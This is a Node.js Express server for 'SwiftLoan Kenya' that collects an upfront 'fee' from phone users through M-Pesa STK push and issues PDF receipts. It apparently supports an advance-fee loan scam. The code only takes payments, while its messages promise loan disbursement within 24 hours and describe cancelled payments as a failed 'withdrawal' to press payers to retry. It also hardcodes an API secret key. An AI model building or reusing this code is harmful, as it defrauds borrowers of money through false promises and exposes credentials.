const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const PDFDocument = require("pdfkit");

const app = express();
const PORT = 3000;

const SWIFTWALLET_API_KEY = "f7a932be3cd1251ab70bae129aacd9ae527287e927c5f45ec1cf4a3948eaf443";

const receiptsFile = path.join(__dirname, "receipts.json");

app.use(bodyParser.json());
app.use(
  cors({
    origin: "https://swiftfinancelmtd.onrender.com"
  })
);

function readReceipts() {
  if (!fs.existsSync(receiptsFile)) return {};
  return JSON.parse(fs.readFileSync(receiptsFile));
}
function writeReceipts(data) {
  fs.writeFileSync(receiptsFile, JSON.stringify(data, null, 2));
}

function formatPhone(phone) {
  const digits = phone.replace(/\D/g, "");
  if (digits.length === 9 && digits.startsWith("7")) return "254" + digits;
  if (digits.length === 10 && digits.startsWith("07"))
    return "254" + digits.substring(1);
  if (digits.length === 12 && digits.startsWith("254")) return digits;
  return null;
}

app.post("/pay", async (req, res) => {
  console.log("===== PAYMENT REQUEST STARTED =====");
  console.log("Timestamp:", new Date().toISOString());
  console.log("Request body:", JSON.stringify(req.body, null, 2));

  try {
    const { phone, amount, loan_amount } = req.body;
    const formattedPhone = formatPhone(phone);

    console.log("Formatted phone:", formattedPhone);
    console.log("Amount:", amount);

    if (!formattedPhone) {
      console.log("ERROR: Invalid phone format");
      return res.status(400).json({ success: false, error: "Invalid phone format" });
    }
    if (!amount || amount < 1) {
      console.log("ERROR: Invalid amount");
      return res.status(400).json({ success: false, error: "Amount must be >= 1" });
    }

    const reference = "ORDER-" + Date.now();
    console.log("Generated reference:", reference);

    const payload = {
      amount: Math.round(amount),
      phone_number: formattedPhone,
      external_reference: reference,
      customer_name: "Customer",
      callback_url: "https://swift-capital-fee-kuxs.onrender.com/callback",
      channel_id: 235
    };

    console.log("Sending to SwiftWallet API v3:");
    console.log("URL: https://swiftwallet.co.ke/v3/stk-initiate/");
    console.log("Payload:", JSON.stringify(payload, null, 2));
    console.log("Headers: Authorization: Bearer ***REDACTED***");

    const url = "https://swiftwallet.co.ke/v3/stk-initiate/";
    const resp = await axios.post(url, payload, {
      headers: {
        Authorization: `Bearer ${SWIFTWALLET_API_KEY}`,
        "Content-Type": "application/json"
      }
    });

    console.log("===== SWIFTWALLET API RESPONSE =====");
    console.log("Status:", resp.status);
    console.log("Headers:", JSON.stringify(resp.headers, null, 2));
    console.log("Data:", JSON.stringify(resp.data, null, 2));

    // Check if response is HTML (Cloudflare/reCAPTCHA block)
    if (typeof resp.data === 'string' && resp.data.includes('<!DOCTYPE')) {
      console.log("===== SWIFTWALLET API BLOCKED BY CLOUDFLARE =====");
      console.log("The API returned a captcha/bot challenge page");
      console.log("Your server IP may need to be whitelisted with SwiftWallet");
      
      return res.status(503).json({
        success: false,
        error: "Payment service temporarily unavailable. Please try again later or contact support.",
        details: "Server blocked by payment provider security"
      });
    }

    if (resp.data.success) {
      const receiptData = {
        reference,
        transaction_id: resp.data.transaction_id || null,
        transaction_code: null,
        amount: Math.round(amount),
        loan_amount: loan_amount || "50000",
        phone: formattedPhone,
        customer_name: "N/A",
        status: "pending",
        status_note: `STK push sent to ${formattedPhone}. Please enter your M-Pesa PIN to complete the fee payment and loan disbursement. Withdrawal started.....`,
        timestamp: new Date().toISOString()
      };

      let receipts = readReceipts();
      receipts[reference] = receiptData;
      writeReceipts(receipts);

      console.log("SUCCESS: STK push initiated");
      console.log("Receipt saved:", JSON.stringify(receiptData, null, 2));

      res.json({
        success: true,
        message: "STK push sent, check your phone",
        reference,
        receipt: receiptData
      });
    } else {
      console.log("===== SWIFTWALLET API RETURNED FAILURE =====");
      console.log("Error from API:", resp.data.error);
      console.log("Full response:", JSON.stringify(resp.data, null, 2));

      const failedReceiptData = {
        reference,
        transaction_id: resp.data.transaction_id || null,
        transaction_code: null,
        amount: Math.round(amount),
        loan_amount: loan_amount || "50000",
        phone: formattedPhone,
        customer_name: "N/A",
        status: "stk_failed",
        status_note: resp.data.error || "STK push failed to send. Please try again or contact support.",
        timestamp: new Date().toISOString()
      };

      let receipts = readReceipts();
      receipts[reference] = failedReceiptData;
      writeReceipts(receipts);

      res.status(400).json({
        success: false,
        error: resp.data.error || "Failed to initiate payment",
        receipt: failedReceiptData
      });
    }
  } catch (err) {
    console.log("===== PAYMENT ERROR CAUGHT =====");
    console.log("Error message:", err.message);
    console.log("Error name:", err.name);
    console.log("Error stack:", err.stack);
    
    if (err.response) {
      console.log("===== AXIOS ERROR RESPONSE =====");
      console.log("Status:", err.response.status);
      console.log("Status Text:", err.response.statusText);
      console.log("Headers:", JSON.stringify(err.response.headers, null, 2));
      console.log("Data:", JSON.stringify(err.response.data, null, 2));
    } else if (err.request) {
      console.log("===== AXIOS REQUEST ERROR (No response received) =====");
      console.log("Request made but no response received");
    } else {
      console.log("===== GENERAL ERROR =====");
      console.log("Error setting up request:", err.message);
    }

    const reference = "ORDER-" + Date.now();
    const { phone, amount, loan_amount } = req.body;
    const formattedPhone = formatPhone(phone);

    const errorReceiptData = {
      reference,
      transaction_id: null,
      transaction_code: null,
      amount: amount ? Math.round(amount) : null,
      loan_amount: loan_amount || "50000",
      phone: formattedPhone,
      customer_name: "N/A",
      status: "error",
      status_note: err.response?.data?.error || err.message || "System error occurred. Please try again later.",
      timestamp: new Date().toISOString()
    };

    let receipts = readReceipts();
    receipts[reference] = errorReceiptData;
    writeReceipts(receipts);

    res.status(500).json({
      success: false,
      error: err.response?.data?.error || err.message || "Server error",
      receipt: errorReceiptData
    });
  }
  console.log("===== PAYMENT REQUEST ENDED =====\n");
});

app.post("/callback", (req, res) => {
  console.log("===== CALLBACK RECEIVED =====");
  console.log("Timestamp:", new Date().toISOString());
  console.log("Callback body:", JSON.stringify(req.body, null, 2));

  const data = req.body;
  const ref = data.external_reference;
  let receipts = readReceipts();
  const existingReceipt = receipts[ref] || {};

  console.log("Reference:", ref);
  console.log("Existing receipt:", JSON.stringify(existingReceipt, null, 2));

  const status = data.status?.toLowerCase();
  const resultCode = data.result?.ResultCode;

  console.log("Status:", status);
  console.log("ResultCode:", resultCode);

  const customerName =
    data.result?.Name ||
    [data.result?.FirstName, data.result?.MiddleName, data.result?.LastName].filter(Boolean).join(" ") ||
    existingReceipt.customer_name ||
    "N/A";

  if ((status === "completed" && data.success === true) || resultCode === 0) {
    console.log("PAYMENT SUCCESS - Updating receipt to processing");
    receipts[ref] = {
      ...existingReceipt,
      reference: ref,
      transaction_id: data.transaction_id,
      transaction_code: data.result?.MpesaReceiptNumber || null,
      amount: data.result?.Amount || existingReceipt.amount,
      loan_amount: existingReceipt.loan_amount || "50000",
      phone: data.result?.Phone || existingReceipt.phone,
      customer_name: customerName,
      status: "processing",
      status_note: `Your fee payment has been received and verified.  
Loan Reference: ${ref}.  
Your loan is now in the final processing stage and funds are reserved for disbursement.  
You will receive the amount in your selected account within 24 hours, an sms will be sent to you.
Thank you for choosing SwiftLoan Kenya.`,
      timestamp: data.timestamp || new Date().toISOString(),
    };
  } else {
    console.log("PAYMENT FAILED/CANCELLED - ResultCode:", resultCode);
    let statusNote = data.result?.ResultDesc || "Payment failed or was cancelled.";

    switch (data.result?.ResultCode) {
      case 1032:
        statusNote = "You cancelled the payment request on your phone. Please try again to complete your loan withdrawal. If you had an issue contact us using the chat blue button at the left side of your phone screen for quick help.";
        break;
      case 1037:
        statusNote = "The request timed out. You did not enter your M-Pesa PIN to complete withdrawal request. Please try again.";
        break;
      case 2001:
        statusNote = "Payment failed due to insufficient M-Pesa balance. Please top up and try to withdraw again.";
        break;
      default:
        break;
    }

    receipts[ref] = {
      reference: ref,
      transaction_id: data.transaction_id,
      transaction_code: null,
      amount: data.result?.Amount || existingReceipt.amount || null,
      loan_amount: existingReceipt.loan_amount || "50000",
      phone: data.result?.Phone || existingReceipt.phone || null,
      customer_name: customerName,
      status: "cancelled",
      status_note: statusNote,
      timestamp: data.timestamp || new Date().toISOString(),
    };
  }

  writeReceipts(receipts);
  console.log("Updated receipt:", JSON.stringify(receipts[ref], null, 2));
  console.log("===== CALLBACK PROCESSED =====\n");

  res.json({ ResultCode: 0, ResultDesc: "Success" });
});

app.get("/receipt/:reference", (req, res) => {
  console.log("===== RECEIPT FETCH =====");
  console.log("Reference:", req.params.reference);

  const receipts = readReceipts();
  const receipt = receipts[req.params.reference];

  if (!receipt) {
    console.log("Receipt not found");
    return res.status(404).json({ success: false, error: "Receipt not found" });
  }

  console.log("Receipt found:", JSON.stringify(receipt, null, 2));
  res.json({ success: true, receipt });
});

app.get("/receipt/:reference/pdf", (req, res) => {
  console.log("===== PDF RECEIPT FETCH =====");
  console.log("Reference:", req.params.reference);

  const receipts = readReceipts();
  const receipt = receipts[req.params.reference];

  if (!receipt) {
    console.log("Receipt not found for PDF");
    return res.status(404).json({ success: false, error: "Receipt not found" });
  }

  generateReceiptPDF(receipt, res);
});

function generateReceiptPDF(receipt, res) {
  res.setHeader("Content-Type", "application/pdf");
  res.setHeader("Content-Disposition", `attachment; filename=receipt-${receipt.reference}.pdf`);

  const doc = new PDFDocument({ margin: 50 });
  doc.pipe(res);

  let headerColor = "#2196F3";
  let watermarkText = "";
  let watermarkColor = "green";

  if (receipt.status === "success") {
    headerColor = "#2196F3";
    watermarkText = "PAID";
    watermarkColor = "green";
  } else if (["cancelled", "error", "stk_failed"].includes(receipt.status)) {
    headerColor = "#f44336";
    watermarkText = "FAILED";
    watermarkColor = "red";
  } else if (receipt.status === "pending") {
    headerColor = "#ff9800";
    watermarkText = "PENDING";
    watermarkColor = "gray";
  } else if (receipt.status === "processing") {
    headerColor = "#2196F3";
    watermarkText = "PROCESSING - FUNDS RESERVED";
    watermarkColor = "blue";
  } else if (receipt.status === "loan_released") {
    headerColor = "#4caf50";
    watermarkText = "RELEASED";
    watermarkColor = "green";
  }

  doc.rect(0, 0, doc.page.width, 80).fill(headerColor);
  doc
    .fillColor("white")
    .fontSize(24)
    .text("SWIFTLOAN KENYA LOAN RECEIPT", 50, 25, { align: "left" })
    .fontSize(12)
    .text("Loan & Payment Receipt", 50, 55);

  doc.moveDown(3);

  doc.fillColor("black").fontSize(14).text("Receipt Details", { underline: true });
  doc.moveDown();

  const details = [
    ["Reference", receipt.reference],
    ["Transaction ID", receipt.transaction_id || "N/A"],
    ["Transaction Code", receipt.transaction_code || "N/A"],
    ["Fee Amount", `KSH ${receipt.amount}`],
    ["Loan Amount", `KSH ${receipt.loan_amount}`],
    ["Phone", receipt.phone],
    ["Customer Name", receipt.customer_name || "N/A"],
    ["Status", receipt.status.toUpperCase()],
    ["Time", new Date(receipt.timestamp).toLocaleString()],
  ];

  details.forEach(([key, value]) => {
    doc.fontSize(12).text(`${key}: `, { continued: true }).text(value);
  });

  doc.moveDown();

  if (receipt.status_note) {
    doc.fontSize(12).fillColor("#555").text("Note:", { underline: true }).moveDown(0.5).text(receipt.status_note);
  }

  if (watermarkText) {
    doc
      .fontSize(60)
      .fillColor(watermarkColor)
      .opacity(0.2)
      .rotate(-30, { origin: [300, 400] })
      .text(watermarkText, 150, 400, { align: "center" })
      .rotate(30, { origin: [300, 400] })
      .opacity(1);
  }

  doc.moveDown(2);
  doc.fontSize(10).fillColor("gray").text("SwiftLoan Kenya © 2024", { align: "center" });

  doc.end();
}

app.listen(PORT, () => {
  console.log("===== SERVER STARTED =====");
  console.log(`Server running on port ${PORT}`);
  console.log("Timestamp:", new Date().toISOString());
  console.log("===========================\n");
});
